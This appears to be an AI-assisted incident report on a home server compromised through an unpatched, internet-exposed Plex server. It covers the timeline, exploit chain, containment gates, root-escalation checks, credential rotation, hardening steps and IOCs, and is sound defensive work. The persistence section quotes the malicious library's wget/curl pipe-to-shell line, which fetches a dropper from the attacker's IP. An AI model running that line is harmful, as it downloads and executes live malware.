# Athena Plex compromise (2026-10-17): incident report

Last updated 2026-10-17 ~12:40 EDT. All times are EDT. This repository is public, so the
report contains no secret values, public IPs, or SSH ports for athena. It follows the
approved plan `202610/athena_plex_compromise_response.md` (plans sidecar). It also builds
on the credential-exposure report `202610/athena_plex_breach_credential_exposure.md` (this
repo), which owns the per-credential detail.

## Status at a glance

| Item                                                              | State                                                                                                   |
| ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| Attacker processes (miner, DDoS bot)                              | **Killed** (Gate A, 07:56). None since (rechecked 10:40 and 12:35).                                     |
| Persistence (`zzdf950053.so` loaded by every Plex scan/transcode) | **Removed.** Gate A quarantined the `.so`; Gate B quarantined the rest of the code-bearing Plex data.   |
| Plex software                                                     | **Patched** to 1.43.4.10903 from the signed `repo.plex.tv` repo. Future updates arrive through apt.     |
| Plex service                                                      | **Disabled and stopped, on purpose.** Start it when you're ready (see "What you still need to do").     |
| Plex network exposure                                             | **Closed.** Remote Access, manual port mapping, and Relay are off. `plex_guard` firewall is persistent. |
| Internet exposure of athena                                       | **Only sshd** (full TCP rescan from apollo after Gate B). The router has no Plex UPnP mapping.          |
| Egress to attacker, C2, and pool IPs                              | **Blocked** (runtime `inet ir_block` table; lost on reboot, which is fine now).                         |
| Did the attacker reach root?                                      | **No.** `auth.log` for the window is clean; all three Gate B tripwires were false positives.            |
| Home directory exposure                                           | **Fixed**, including old backup snapshots that still had world-readable secrets (locked at 12:34).      |
| `/mnt/hercules` media, backups, archive                           | **Clean** (ctime sweeps; details below).                                                                |
| Credentials                                                       | **Your action needed** (see "What you still need to do").                                               |

## Bottom line

- **How they got in:** athena ran Plex Media Server **1.42.2**, and the router exposed it
  to the internet through UPnP. An unauthenticated attacker used a known Plex bug chain
  (fixed in Plex's September 2026 security release, 1.43.3.10896+) to steal the server
  owner's Plex token. They then used the token to write and load a malicious library,
  which ran their code as the `plex` user.
- **Why Plex was never patched:** Plex moved its apt repository to `repo.plex.tv` with a
  new signing key. The old repo (`downloads.plex.tv/repo/deb`) was frozen at 1.42.2 on
  2025-09-22, so `apt upgrade` silently stopped offering Plex updates for over a year.
- **What they did:** they ran an XMRig Monero miner (`x12345`, rig id `plex`) and a
  Gafgyt/Mirai-style DDoS bot disguised as `inetd`. Every hourly Plex library scan
  reloaded the malicious library, which re-downloaded and relaunched the payloads.
- **Did they get further?** No evidence of it. They stayed the `plex` user. While they
  were, they could read every world-readable file in your home, which **included your
  current athena login/sudo password** and many API keys (see the credential-exposure
  report). That password is now the main thing to fix: rotate it, and treat every exposed
  credential as known to the attacker.
- **Recovery mode stands at "clean in place."** No rebuild is needed on today's evidence.

## Timeline

| Time         | Event                                                                                                                                                                                                                           |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2025-09-22   | Plex's old apt repo stops receiving builds. athena stays on 1.42.2.                                                                                                                                                             |
| Sep 2026     | Plex ships 1.43.3.10861/10896, which fixes CompanionProxy (PM-5763), the `/player/timeline` SSRF (CVE-2026-96652), and network-settable `TranscoderH264Options` (PM-5766).                                                      |
| 10-17 01:11  | The nightly `/var` backup runs. It is the last snapshot before the breach.                                                                                                                                                      |
| 01:24        | Recon from `45.194.92.222` (`GET /` → 401).                                                                                                                                                                                     |
| 01:48:10     | Unauthenticated `/player/proxy/poll` registers a fake player (`poc_…`).                                                                                                                                                         |
| 01:48:12     | `/player/timeline/subscribe` with a loopback `protocol=` URL. On unsubscribe, CompanionProxy calls a legacy TheTVDB agent over trusted loopback, and the agent fetches an attacker URL **carrying the owner's Plex token**.     |
| 01:48:14     | The attacker uses the token over the WAN. They set `TranscoderH264Options=dump-yuv=<Codecs>/…/zzdf950053.so`, then transcode an attacker video so x264 writes attacker bytes into that `.so`.                                   |
| 01:48:22     | A second transcode loads the Codecs dir through `FFMPEG_EXTERNAL_LIBS`, which runs the `.so` constructor as `plex`. They then reset the pref to hide it.                                                                        |
| 02:13        | Miner `/tmp/x12345` dropped. Load average later peaks around 72.                                                                                                                                                                |
| 06:04        | You log in from the MacBook over the tailnet and notice the miner.                                                                                                                                                              |
| 06:15, 07:20 | The bot (`/tmp/libcow.so`, running as `inetd`) respawns right after Plex scanner jobs.                                                                                                                                          |
| 07:11, 07:22 | `sudo kill -9` of the miner from your terminal session. It comes back each time.                                                                                                                                                |
| 07:56–08:48  | **Gate A:** the implant is frozen (`SIGSTOP`) and captured, then egress is blocked, Plex is disabled and stopped, all `plex` processes are killed, the three samples are quarantined, root triage runs, and evidence is sealed. |
| 09:00–10:05  | Non-root analysis, the hercules media sweep, the apt-repo diagnosis, a verified patch download, the home permission lock, and Gate B preparation.                                                                               |
| 10:12–10:32  | **Gate B:** triage, quarantine, Plex preferences, Transmission, firewall guard, apt source, 1.43.4 install, and evidence seal. The final `start` step refused because tripwires fired.                                          |
| 10:35–12:40  | Tripwire review (all false positives), UPnP and external-exposure checks, hercules backup sweeps, and the backup permission lock.                                                                                               |

## How the persistence worked

`zzdf950053.so` sat in Plex's Codecs directory, which Plex passes to every transcoder and
scanner run through `FFMPEG_EXTERNAL_LIBS`. Its only interesting string is:

```
(wget http://217.60.194.116/plex -O- || curl http://217.60.194.116/plex -o-)|sh
```

So every scan or transcode re-ran a dropper script from the attacker's server. That is why
killing the processes alone never stuck. Plex's own stderr in syslog confirms it: from
01:48:23 on, the only lines are that `wget` failing or retrying, plus the miner's pool
connection log. The dropper script itself was **not** fetched, to avoid touching attacker
infrastructure. With the `.so` and the whole Codecs tree quarantined, Plex patched and
stopped, and `217.60.194.116` blocked, the loop is broken. Nothing has respawned since
07:56.

## What was done

### Gate A (approved, ran 07:56–08:48)

- **Froze, then killed.** Implant pid 3448219 (`exe=/tmp/libcow.so`, `cmdline=inetd`) was
  stopped and its `/proc` state (maps, fds, exe copy, environ) captured root-only.
  `plexmediaserver` was disabled and stopped, and `ps -u plex` is empty.
- **Egress block (runtime):** drop `45.194.92.222`, `178.16.53.68`, `178.16.53.59` (live
  C2 at capture time, port 8080), `217.60.194.116`, and any `tcp dport 3333`.
- **Quarantine (`mv` + `chmod 000`):** `/tmp/x12345`, `/tmp/libcow.so`, `zzdf950053.so`.
- **Root triage (clean):**
  - `dpkg --verify` shows only edited config files (no binaries or libraries).
  - The only SUID/SGID files changed since September are package files (chrome-sandbox,
    Xorg.wrap, ntfs-3g).
  - No `/etc/ld.so.preload`. No plex crontab, no `at`, no new cron entries.
  - `passwd`, `shadow`, `group`, `sudoers`, and every `authorized_keys` predate the
    breach.
  - No changed files under `/etc`, `/usr`, or `/boot` by mtime.
- **Sealed** `/root/ir-athena-20261017-evidence.tgz` (sha256
  `b3ddb986be15677af7f1e2602c5efb9352bbdf41289bd66a77ab2cf87f8e1b0e`).

### Between the gates (no root needed)

- **Evidence off-host.** Copied the sealed tarball to apollo
  `~/incidents/athena-20261017/` (700/600), and verified that its hash matches.
- **Sample fingerprints.** Hashes, file types, and strings only; nothing was extracted or
  run. See the IOC table.
- **Root-escalation paths checked:**
  - Root cron runs scripts from `~/db/bin/cron.jobs/` and `~/db/bin/main/`. None of them,
    or their parent directories, were writable by `plex`.
  - Of 11,048 world-writable paths in `~`, **none were modified after 01:45**. `plex`
    could not have backdated them, because it did not own them.
  - No new docker containers or images. No changes to dotfiles, user systemd units,
    autostart, or crontab.
- **`/mnt/hercules` media sweep.** No files of any owner changed since 01:45 in `plex/`,
  `misc/`, or `motion/`.
- **Lateral movement into apollo:** wtmp shows no logins from athena's addresses since the
  breach. apollo's `auth.log` needs root and was not read.
- **Root cause of the missed updates.** The old repo's `InRelease` is dated 2025-09-22.
  The new repo `https://repo.plex.tv/deb/ public main` is signed by the ed25519
  `PlexSign.v2` key (primary `6EFF EB47 8A65 59D7 5C7C 4FE7 06C5 2179 0B9C FFDE`, signing
  subkey `B406F0897A39A570804260540A05F1E6E7AFD573`) and carries 1.43.4.10903.
- **Patch download:** `plexmediaserver_1.43.4.10903-e5521bd8c_amd64.deb`. Its SHA1 matches
  Plex's download API, and its SHA256 (`6f6a1c83…3edb`) matches the signed repo's
  `Packages` index.
- **Home lock (`home_perms = lock`).** A before-snapshot of the old modes is kept in
  `~/ir-athena-20261017/snapshots/home-perms.before.txt`.
  - `/home/bryan` and `~/.config` are now 750.
  - Exposed secret files are now 600: `.claude.json(.backup)`, `actual/.env`, the taskd
    key and certificate, the Gemini accounts file, the qwen settings, `.mutt/passwd`,
    `.config/hub`, and old SASE `.env` backups.
  - These directories lost group/other access: transcripts, shell-history archive, vim
    undo, mcfly, ipython, backups, `.password-store` (now 700/600), and the docker config.
  - Every world-writable path in `~` lost `o+w`.

### Gate B (approved, ran 10:12–10:32)

Gate B was one reviewed sudo batch. Every step except `start` succeeded:

- **Staged-file check passed.** All seven staged files (script, firewall rules, units, apt
  source, keyring, and `.deb`) matched the SHA256 values written into the request.
- **Triage** ran. It wrote a `TRIPWIRE` marker; the next section shows why it was a false
  alarm.
- **Quarantine:** 306 files moved into root-only evidence.
  - The whole `Codecs/` tree. It held only stock `lib*_decoder.so` and `lib*_encoder.so`,
    with no other `zz*.so`.
  - `Crash Reports/`, the non-stock `Plug-ins/Services.bundle` (287 files), and one
    plex-owned file in `/dev/shm`.
  - The empty `Updates/`, `Drivers/`, `Cache/Transcode`, and GPU driver caches.
  - The manifest flagged 0 unexpected `.so` files.
- **Preferences.xml:**
  - `TranscoderH264Options` removed.
  - Remote Access off (`PublishServerOnPlexOnlineKey=0`).
  - Manual port mapping off.
  - **Relay off.** Relay is an internet path that would bypass the firewall.
  - `allowedNetworks` is private-only, and the file is `plex`-owned with mode 600.
- **Transmission:**
  - `settings.json` is now 600 (was 660). It holds the RPC password and was writable by
    `plex` through the `debian-transmission` group.
  - `plex` was removed from `debian-transmission`.
- **Firewall guard.**
  - The `inet plex_guard` table allows TCP 32400/32469 only from `lo`, `tailscale0`, and
    192.168.1.0/24, and drops everything else, IPv6 included.
  - `plex-guard.service` loads it at boot.
  - `plexmediaserver` now _requires_ the guard, so Plex can never start unguarded.
- **apt:** now uses `repo.plex.tv` with the v2 keyring.
- **Install:** 1.43.4.10903 installed, plus `miniupnpc`. Plex stayed disabled.
- **Seal:** `/root/ir-athena-20261017-gateb.tgz` (sha256
  `6c5504e3578a3ab7f4d38fe845797aa77feccc8f6ec1c1807d64b7d1cc4aaad2`).
- **Start: refused.** The `TRIPWIRE` marker blocked it by design, so Plex is still
  disabled. The marker is still in place; see "What you still need to do" to start Plex.

### After Gate B (no root needed)

- **Tripwires reviewed.** All three were false positives (see the next section).
- **UPnP.** `upnpc -l` against the router shows **no mapping for Plex/32400**. The old
  mapping lapsed once Plex stopped, and Remote Access is now off, so Plex will not
  recreate it. There are three other mappings, and none were removed:
  - two Tailscale NAT-PMP UDP mappings (athena, and one other LAN device)
  - one UDP video stream from a LAN camera
- **External exposure, rechecked.** A full TCP scan of athena's public IPv4 from apollo
  (not on athena's LAN) shows exactly one open port: athena's sshd on its non-standard
  port (`SSH-2.0` banner). `https` and `http` to `:32400/identity` both time out.
- **Containment recheck at 12:35:**
  - no `plex` processes
  - no `plex`-owned files in `/tmp`, `/var/tmp`, or `/dev/shm`
  - no processes executing from temp or deleted paths
  - no sockets to any IOC or port 3333
  - `plex-guard` active, and `plexmediaserver` disabled and inactive
- **`/mnt/hercules` backups and archive** (ctime-based, which catches backdated files):
  - **The Plex data trees in all four `/var` snapshots are clean.** That covers the Oct 17
    01:11 snapshot from just before the breach, plus Oct 16, 9, and 8. Zero entries
    changed after 01:45. The only unreadable path was Plex's own `.nv` GPU shader cache.
  - **`/mnt/hercules/archive` contains no `plex`-owned files.**
  - **The rest of the backup tree**, with the `/var/tmp` copies pruned: the sweep found no
    `plex`-owned entries changed after 01:45. It ran 40 minutes without reaching the end;
    a complete pass is impractical because the tree holds millions of test temp files.
    - It did flag 35,152 `bryan`-owned entries with fresh ctimes. These all come from the
      hourly root backup job: it hardlinks unchanged files across snapshots, and each new
      link bumps the shared inode's ctime.
  - **Finding: old snapshots kept the old, world-readable modes.**
    - Every `/home` snapshot older than this morning's lock still had `~` at 755 and the
      secret files at 644/664 (`.claude.json`, `.mutt/passwd`, `.config/hub`,
      `actual/.env`, `.password-store`).
    - `/mnt/hercules/backup` and `/mnt/hercules/archive` were 755, so any local account
      could still read them.
    - Both roots are now **700 `bryan`**. The backup job runs as root and is unaffected,
      and nothing else reads those trees.
    - Before-snapshot: `~/ir-athena-20261017/snapshots/hercules-perms.before.txt`.
  - If you ever restore from backup, use snapshots taken before 01:45 on Oct 17: `/var`
    `daily` (01:11) and `/home` `hourly-2` (00:37). Never restore `tmp`.

## Did the attacker get root?

**No. Nothing shows the attacker went beyond the `plex` user, so a rebuild isn't
warranted.**

- **`auth.log` covers the whole breach window**, even though the systemd journal rotated
  past it. rsyslog's file has every auth event from 01:54 to 07:50.
  - 79 logins, all `bryan` by public key, all from your MacBook or apollo over the tailnet
    with their known keys.
  - 3 `sudo` lines, all `bryan` from your terminal session: two `kill -9` of the miner at
    07:11 and 07:22, and one non-interactive check at 07:13 that sudo refused.
  - **Zero** `su`, `pkexec`, polkit, password or keyboard-interactive logins, failed
    authentications, account or group changes, or lines from `plex`/uid 998.
- **Why Gate B's tripwires fired anyway.** They were deliberately broad, and each one has
  an innocent explanation:
  1. _"root process from writable path" (pid 5164)._ This is `multivisor-rpc`, which root
     supervisord has run from your pipx venv since boot on Oct 15, two days before the
     breach. Nothing in that venv or its pyenv interpreter changed after 01:45, and `plex`
     couldn't write there. supervisord's log has no entries since Oct 15, so nothing used
     it to restart programs during the window. It is still a hardening issue (see
     "Preventing a repeat").
  2. _"root process from writable path" (pid 1326770)._ This was Gate B's own runner, the
     sase tool's uv-managed Python. It started 11 seconds after the Gate B `sudo` and
     exited with it.
  3. _"plex appears in sudo journal"._ The match was your own 08:39 `sudo bat` of the Gate
     A file `plex-owned.since-exploit.txt`; the pattern matched the word "plex" in that
     file name. No line involves the `plex` user.
- **Supporting checks:**
  - **System files** changed since 01:45, by ctime: only expected writers.
    - Tailscale's `resolv.conf`, the PIA VPN data file, the postfix spool, and
      anacron/timer stamps.
    - Gate A's own changes (the evidence files, and disabling Plex).
  - **No SUID/SGID** file changed since 01:45.
  - **`plex`-owned changes** are all inside the Plex data dir (logs, library DB, agent
    caches).
  - **Kernel:** taint comes only from the NVIDIA modules. The journal has no module-load
    or segfault lines from this boot.
  - **Plex's stderr** shows the dropper and miner only, with no `su`/`sudo` attempts.
  - **Gate A's triage** was also clean: package files intact, no preload, and no changed
    auth files.
- **Residual risk.** A negative can't be proven, and your password was readable. Rotating
  it closes that path for good. If anything respawns, or an unknown root process or file
  shows up, switch to the plan's rebuild runbook. Keep Plex off, reinstall carrying only
  media and reviewed data, and rotate everything, including SSH host and user keys.

## What you still need to do (in priority order)

1. **Change your athena login/sudo password now.** Change it everywhere else you reused it
   too. The private checklist on apollo
   (`~/incidents/athena-20261017/exposed-credentials-checklist.md`) lists the accounts.
2. **Plex account** (do this before starting Plex again):
   - Change the password, then use **Sign out of all devices**. That revokes the stolen
     owner token.
   - Turn on 2FA.
   - Remove unknown devices (anything named `poc_*`), friends, and shares, and check the
     account email.
3. **Start Plex when you're ready.** It is patched, firewalled, and has internet access
   turned off.
   ```
   sudo mv /root/ir-athena-20261017/gate_b/TRIPWIRE{,.reviewed-false-positive}
   sudo /usr/bin/python3 -I /root/ir-athena-20261017/gate_b/stage/ir_gate_b.py start
   ```

   - `start` refuses unless `plex-guard` is active. Afterwards, it re-checks
     Preferences.xml.
   - Then check that `curl -s http://athena:32400/identity` answers over the tailnet.
   - If the server lost its claim, re-claim it from athena itself:
     `ssh -L 32400:localhost:32400 athena`, then open `http://localhost:32400/web`.
   - After the next hourly scan, an agent can re-run the post-start checks in one pass:
     - only `/usr/lib/plexmediaserver` binaries running as `plex`
     - only `lib*_decoder.so`/`lib*_encoder.so` in the new Codecs dir
     - no new "External lib has no loading function" in the Scanner logs
     - no new UPnP mapping
4. **Router (192.168.1.1):**
   - **Turn UPnP/NAT-PMP off.** Tailscale keeps working (it hole-punches, or falls back to
     its relays), but the LAN camera's direct stream may need its cloud relay.
   - Change the admin password. It was in readable shell history.
   - Review port forwards. Keep the SSH forward only if you need WAN SSH, since Tailscale
     already covers it.
   - Check inbound IPv6 rules, DNS servers, remote administration, firmware, and unknown
     devices.
5. **Rotate the other exposed credentials** listed in the credential-exposure report:
   - Google account, plus the `gog` and Keep tokens
   - Gemini, Anthropic, Qwen, and OpenAI API keys
   - the GitHub `gh` token (and review GitHub's security log)
   - Zotero and Codecov tokens
   - brokerage 2FA backup codes
   - the **Transmission RPC password**
   - **New:** the supervisord XML-RPC password in `/etc/supervisor/supervisord.conf`. The
     file is world-readable (644), so `plex` could read it. `bob-cli-8u` tracks the fix.
6. **Purge plaintext secret copies.**
   - Locations: the shell-history archive, agent transcripts, vim undo, mcfly, the IPython
     history, and the old DD-WRT backup.
   - The older `/mnt/hercules/backup/home` snapshots hold the same secrets. They are no
     longer readable by others. They become harmless once the secrets are rotated, or
     prune them.
   - Also check whether `~/db` or `~/Sync` replicate them to other machines.
7. **Optional checks:**
   - Run `sudo grep -E '100\.87\.31\.114|192\.168\.1\.156' /var/log/auth.log` on apollo.
   - Scan LAN IoT devices (cameras) for default credentials, since Gafgyt-family bots
     propagate that way. Only a C2 connection was observed.

## Preventing a repeat

1. **Patch internet-facing software automatically.**
   - Gate B fixed the Plex apt source.
   - Also add `repo.plex.tv` to unattended-upgrades origins, or schedule
     `apt-get install --only-upgrade plexmediaserver`.
   - Alert when any apt source fails signature checks or goes stale for more than 7 days.
     That would have caught this a year ago. It is already happening again: the GitHub CLI
     source (`cli.github.com`) now fails with a missing signing key, so `gh` updates have
     quietly stopped.
2. **Expose nothing by accident.**
   - Keep router UPnP off.
   - Reach home services over Tailscale only.
   - Keep `plex_guard` (default-deny on Plex ports) in place.
   - Rerun the external port scan from apollo periodically.
3. **Sandbox Plex with systemd** (follow-up, needs testing with hardware transcoding):
   - `ProtectHome=yes` alone would have hidden your entire home, including the leaked
     password.
   - Also: `ProtectSystem=strict` with `ReadWritePaths=` for the Plex data dir and
     `/mnt/hercules/plex`, plus `PrivateTmp=yes`, `NoNewPrivileges=yes`, and
     `NoExecPaths=/tmp /var/tmp /dev/shm`.
4. **Keep secrets out of plaintext, including in backups.**
   - Keep `~` at 750 and use `umask 027`.
   - Keep the backup and archive roots at 700. Backups preserve file modes, so a file that
     was ever world-readable stays that way in every old snapshot.
   - Stop pasting secrets into shells or agent sessions: use `HISTIGNORE` or
     space-prefixed commands, and keep env dumps out of transcripts.
   - Keep secrets in `pass` and rotate on schedule.
5. **Reduce privilege paths.**
   - Don't run code from `~` as root.
     - Root supervisord runs `multivisor-rpc` from your pipx venv. It serves the full
       supervisor API unauthenticated on `0.0.0.0:8051`, so any LAN or tailnet host and
       any local service account can call it.
     - Root cron also runs scripts from `~/db/bin`.
     - Move these into root-owned paths, bind the RPC to localhost, and `chmod 600` the
       supervisord config.
   - Treat `docker` group membership as root; consider rootless Docker or `sudo docker`.
   - Mount `/proc` with `hidepid=invisible`, so `$(pass show …)` command lines are not
     visible to other users.
6. **Detect faster.** The load average sat near 70 for about 5 hours unnoticed.
   - Add Prometheus alerts for sustained CPU by service accounts and for outbound
     connections to common pool ports (3333/4444/5555/14444).
   - Add an alert for processes executing from `/tmp` or `/dev/shm`.
   - node_exporter already runs on athena.
7. **Keep forensic logs.**
   - Set sshd `LogLevel` back to `INFO` or `VERBOSE`. DEBUG3 rotated the journal past the
     breach within hours. Only rsyslog's `auth.log` let us rule out root.
   - Give journald a larger `SystemMaxUse`.
   - Forward auth logs off-host (for example, to apollo).
8. **Exclude junk from backups.** Leave `/var/tmp` and test temp trees out of the backup
   set. They hold millions of files, which makes integrity sweeps of the backups
   impractical.

Filed as follow-up task beads (ready for triage):

- `bob-cli-8r`: alerting (#6)
- `bob-cli-8s`: automatic Plex updates and stale-apt alerts (#1). It now also notes the
  `gh` source failure.
- `bob-cli-8t`: Plex systemd sandbox (#3)
- `bob-cli-8u`: the supervisord/`multivisor-rpc` root control channel and its
  world-readable password (#5)

## Indicators of compromise

| Kind                          | Value                                                                                                                                              |
| ----------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| Attacker / payload host       | `45.194.92.222` (ports 8933, 8952; `*.45-194-92-222.sslip.io`)                                                                                     |
| Dropper + mining pool         | `217.60.194.116` (`/plex` script; `ota.proxystream.st:3333`)                                                                                       |
| Bot C2                        | `178.16.53.68:52869`, `178.16.53.59:8080`                                                                                                          |
| Planted codec (loader)        | `zzdf950053.so`, x86-64 shared object, sha256 `a09825f788cded5491b46effecbb9adef8531aba98a78d63a114a246631c588c`                                   |
| Miner (XMRig, RandomX)        | `/tmp/x12345`, static x86-64 ELF, sha256 `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49`                                        |
| DDoS bot (Gafgyt/Mirai-style) | `/tmp/libcow.so` running as `inetd`, static i386 ELF ("TSource Engine"), sha256 `4a0d4381947ca7d2658a67967686fcc5b7e2041394542f975422c66d1a932838` |
| Fake Plex player              | `poc_<hex>_<n>` registered through `/player/proxy/poll`                                                                                            |
| Plex log signature            | `External lib has no loading function` in Scanner logs (the planted `.so` loading)                                                                 |

## Evidence locations

- **athena, root-only:**
  - `/root/ir-athena-20261017/`: proc capture, quarantined samples, triage, and `gate_b/`
    (quarantine, triage, preference backups, and the `TRIPWIRE` marker).
  - `/root/ir-athena-20261017-evidence.tgz` (Gate A) and
    `/root/ir-athena-20261017-gateb.tgz` (Gate B).
- **athena, `bryan` (700/600):** `~/ir-athena-20261017/`, which holds:
  - the redacted triage (`gate_b/` has the Gate B text copies and tarball)
  - the snapshots and the verified `.deb` in `pkg/`
  - the Gate B sources in `staging/gate_b/`
  - The hourly backup now also copies this directory into `/mnt/hercules/backup/home`,
    with its modes intact.
- **athena, `/tmp/ir_herc/`:** the hercules sweep outputs.
- **apollo:** `~/incidents/athena-20261017/` (the Gate A tarball, its hash, and the
  private credential checklist).
- The tarballs contain live malware samples and process `environ` with tokens. Never
  extract them on a machine you care about, and never execute anything from them.
